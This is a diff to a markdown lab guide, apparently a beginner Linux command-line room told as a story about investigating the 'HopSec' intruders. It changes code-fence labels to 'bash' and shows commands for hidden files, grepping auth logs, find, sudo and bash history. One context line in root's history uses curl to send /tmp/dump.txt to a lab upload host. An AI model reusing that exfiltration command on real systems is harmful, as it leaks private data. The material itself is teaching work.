@@ -76,7 +76,7 @@ Linux has a powerful command-line interface, allowing you to use and manage the 
 
   Basic CLI Commands
 
-```Basic CLI Commands
+```bash
 mcskidy@tbfc-web01:~$ echo "Hello World!"
 Hello World!
 mcskidy@tbfc-web01:~$ ls
@@ -99,7 +99,7 @@ Looks like McSkidy left a security guide before being kidnapped - it would defin
 
   Navigating With CD
 
-```Navigating With CD
+```bash
 mcskidy@tbfc-web01:~$ cd Guides
 mcskidy@tbfc-web01:~/Guides$ ls
 ```
@@ -113,7 +113,7 @@ Oh-oh, it looks like the guides aren't there. Or are they? In Linux, files and d
 
   Reading Hidden Files
 
-```Reading Hidden Files
+```bash
 mcskidy@tbfc-web01:~/Guides$ ls -la
 drwxrwxr-x  2 mcskidy mcskidy 4096 Oct 13 01:26 .drwxr-x--- 19 mcskidy mcskidy 4096 Oct 23 12:29 ..-rw-rw-r--  1 mcskidy mcskidy  504 Oct 13 01:26 .guide.txt
 mcskidy@tbfc-web01:~/Guides$ cat .guide.txt
@@ -133,7 +133,7 @@ In her guide, McSkidy refers to `/var/log/`, a Linux directory where all securit
 
   Grepping Logfiles
 
-```Grepping Logfiles
+```bash
 mcskidy@tbfc-web01:~$ cd /var/log
 mcskidy@tbfc-web01:~$ grep "Failed password" auth.log
 2025-10-13T01:43:48 tbfc-web01: Failed password for socmas from eggbox-196.hopsec.thm
@@ -151,7 +151,7 @@ You can see a lot of failed logins on the "socmas" account, all from the HopSec 
 
   Using Find Command
 
-```Using Find Command
+```bash
 mcskidy@tbfc-web01:~$ find /home/socmas -name *egg*
 /home/socmas/2025/eggstrike.sh
 ```
@@ -162,7 +162,7 @@ Looks like you found something, `eggstrike.sh`! Files with the `.sh` extension c
 
 Eggstrike Content
 
-```Eggstrike Content
+```bash
 mcskidy@tbfc-web01:~$ cd /home/socmas/2025
 mcskidy@tbfc-web01:~$ cat eggstrike.sh
 # Eggstrike v0.3
@@ -192,7 +192,7 @@ There are hundreds of CLI commands to view and manage your system. For example, 
 
 Permission Denied
 
-```Permission Denied
+```bash
 mcskidy@tbfc-web01:~$ cat /etc/shadow
 cat: /etc/shadow: Permission denied
 ```
@@ -206,7 +206,7 @@ Root is the default, ultimate Linux user who can do anything on the system. You 
 
   Switching to the Root User
 
-```Switching to the Root User
+```bash
 mcskidy@tbfc-web01:~$ sudo suroot@tbfc-web01:/home/mcskidy$ whoamiroot
 ```
 
@@ -219,7 +219,7 @@ Did you know that every command you run is saved in a hidden history file, also 
 
   Accessing Bash History
 
-```Accessing Bash History
+```bash
 root@tbfc-web01:/home/mcskidy$ cd /root
 root@tbfc-web01:~$ cat .bash_history
 curl --data "@/tmp/dump.txt" http://files.hopsec.thm/upload
